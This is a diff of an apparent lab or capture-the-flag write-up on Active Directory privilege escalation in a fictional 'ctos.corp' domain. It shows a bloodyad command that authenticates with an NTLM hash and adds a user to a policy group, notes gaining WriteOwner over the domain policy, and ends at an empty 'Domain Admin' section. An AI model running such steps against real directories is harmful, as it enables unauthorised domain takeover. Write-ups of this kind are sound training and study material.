@@ -1254,5 +1254,20 @@ This user is now compromised!
 
 I have AddMember on the policy automation group
 
+```python
+bloodyad --host dc01.ctos.corp -d ctos.corp -u it_ops_lead -p ':fd8bd0720fec58d0b5005257dd9f3723' add groupMember 'policy_automation_group' 'it_ops_lead'
+[+] it_ops_lead added to policy_automation_group
+```
 
+Ill add the current user to the group
+
+![1001](Pasted%20image%2020260902152746.png)
+
+I have WriteOwner over the Domain policy
+
+# Domain Admin
+
+```python
+
+```
 
